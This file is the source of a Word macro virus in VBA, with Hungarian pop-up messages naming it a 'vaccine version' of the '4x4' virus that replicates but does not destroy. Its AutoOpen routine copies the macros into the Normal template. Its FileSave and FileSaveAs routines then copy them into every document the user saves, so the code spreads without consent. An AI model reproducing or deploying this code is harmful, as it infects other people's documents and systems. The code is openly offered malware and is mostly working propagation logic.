   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Dim a$
   Dim b$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo vege
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   a$ = WordBasic.[FileName$]()
   b$ = a$ + ":AutoOpen"
   WordBasic.MacroCopy "normal:AutoOpen", b$
   b$ = a$ + ":AutoClose"
   WordBasic.MacroCopy "normal:AutoClose", b$
   b$ = a$ + ":FileSave"
   WordBasic.MacroCopy "normal:FileSave", b$
   b$ = a$ + ":FilePrint"
   WordBasic.MacroCopy "normal:FilePrint", b$
   b$ = a$ + ":FileSaveAs"
   WordBasic.MacroCopy "normal:FileSaveAs", b$
   b$ = a$ + ":Fert"
   WordBasic.MacroCopy "normal:Fert", b$
   vege:
   If Err.Number <> 102 Then
     WordBasic.FileSaveAs dlg
   End If
   End Sub

   Attribute VB_Name = "FilePrint"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo vege
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
   WordBasic.CurValues.FilePrint dlg
   WordBasic.Dialog.FilePrint dlg
   WordBasic.FilePrint dlg
   Rem Csak vakcinaverzió!
   vege:
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo vege
   WordBasic.MsgBox "Ne felejtsd el:" + Chr(13) + "A vírusvédelemre oda kell figyelni!", "4x4 vakcina", 48
   vege:
   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Dim a$
   Dim b$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo vege
   WordBasic.CurValues.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   a$ = WordBasic.[FileName$]()
   b$ = a$ + ":AutoOpen"
   WordBasic.MacroCopy "normal:AutoOpen", b$
   b$ = a$ + ":AutoClose"
   WordBasic.MacroCopy "normal:AutoClose", b$
   b$ = a$ + ":FileSave"
   WordBasic.MacroCopy "normal:FileSave", b$
   b$ = a$ + ":FilePrint"
   WordBasic.MacroCopy "normal:FilePrint", b$
   b$ = a$ + ":FileSaveAs"
   WordBasic.MacroCopy "normal:FileSaveAs", b$
   b$ = a$ + ":Fert"
   vege:
   If Err.Number <> 102 Then
     WordBasic.FileSaveAs dlg
   End If
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim a$
   Dim b$
   On Error GoTo -1: On Error GoTo vege
   WordBasic.MsgBox "Hé Haver! Az én nevem Szunyóg!" + Chr(13) + "Olyan a vírusvédelmed, akár az ementáli! Ez itt" + Chr(13) + "pedig egy 4x4 nevû vírus vakcinaverziója! Ez" + Chr(13) + "azt jelenti, hogy a vírus eme verziója nem tud" + Chr(13) + "rombolni, de szaporodni azt tud." + Chr(13) + "Szerintem azért az ilyesmire éredemes odafigyelni!", "4x4 vakcina", 16
   a$ = WordBasic.[FileName$]()
   b$ = a$ + ":AutoOpen"
   WordBasic.MacroCopy b$, "normal:AutoOpen"
   b$ = a$ + ":AutoClose"
   WordBasic.MacroCopy b$, "normal:AutoClose"
   b$ = a$ + ":FileSave"
   WordBasic.MacroCopy b$, "normal:FileSave"
   b$ = a$ + ":FilePrint"
   WordBasic.MacroCopy b$, "normal:FilePrint"
   b$ = a$ + ":FileSaveAs"
   WordBasic.MacroCopy b$, "normal:FileSaveAs"
   vege:
   End Sub
